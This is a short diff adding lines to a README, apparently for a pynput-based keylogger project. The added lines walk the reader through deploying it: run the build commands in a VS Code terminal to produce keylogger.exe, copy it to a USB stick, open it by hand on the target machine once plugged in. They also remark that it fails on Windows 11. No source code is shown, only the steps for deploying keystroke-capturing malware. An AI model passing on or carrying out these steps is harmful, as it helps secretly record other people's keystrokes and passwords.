@@ -13,3 +13,7 @@ pip install pynput
 ```
 
 + This will generate a (keylogger.exe)
++ Make sure to run these command in your VS code Terminal
++ Once you ran these commands in your terminal it will generate a (keylogger.exe) inside your dist file
++ You need to copy only that in to your pen and once the USB plugged in, you need to open the (keylogger.exe) manually
++ This doesn't work on Windows 11 when the USB plugged in
